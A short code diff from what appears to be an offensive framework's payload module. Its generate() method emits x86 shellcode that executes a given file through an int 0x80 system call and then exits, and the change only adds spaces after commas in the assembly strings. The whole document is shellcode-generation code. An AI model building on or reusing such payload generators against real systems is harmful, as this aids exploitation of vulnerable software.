@@ -15,19 +15,19 @@ class Module(base_module.BasePayload):
 
     def generate(self):
         payload = stack.generate(self.file_dest, '%ebx', 'string')
-        payload += "mov    %%esp,%%ebx"
-        payload += "xor    %%eax,%%eax"
+        payload += "mov    %%esp, %%ebx"
+        payload += "xor    %%eax, %%eax"
         payload += "push   %%eax"
-        payload += "mov    %%esp,%%edx"
+        payload += "mov    %%esp, %%edx"
         payload += "push   %%ebx"
-        payload += "mov    %%esp,%%ecx"
+        payload += "mov    %%esp, %%ecx"
         payload += "push   %%edx"
         payload += "push   %%ecx"
         payload += "push   %%ebx"
-        payload += "mov    $0x3b,%%al"
+        payload += "mov    $0x3b, %%al"
         payload += "push   $0x2a"
         payload += "int    $0x80"
-        payload += "mov    $0x1,%%al"
-        payload += "mov    $0x1,%%bl"
+        payload += "mov    $0x1, %%al"
+        payload += "mov    $0x1, %%bl"
         payload += "int    $0x80"
         return payload
